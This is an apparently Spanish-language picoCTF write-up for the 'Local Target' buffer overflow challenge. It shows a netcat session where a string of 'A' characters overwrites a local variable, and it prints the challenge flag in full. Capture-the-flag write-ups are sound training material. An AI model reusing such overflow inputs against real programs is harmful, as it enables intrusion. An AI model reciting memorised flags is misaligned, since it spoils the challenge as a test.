# Local Target

## Descripcion
Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using:`nc saturn.picoctf.net 53332`
## Pistas
- Do anything you can to change `num`.
- When you change `num`, view the value as hexadecimal.
## Solucion
```
Descargamos el archivo y analizamos el codigo ensamblador con gdb y el comando layout asm:
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 53332
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

```

## Bandera

picoCTF{l0c4l5_1n_5c0p3_fee8ef05}

## Notas adicionales

## Referencias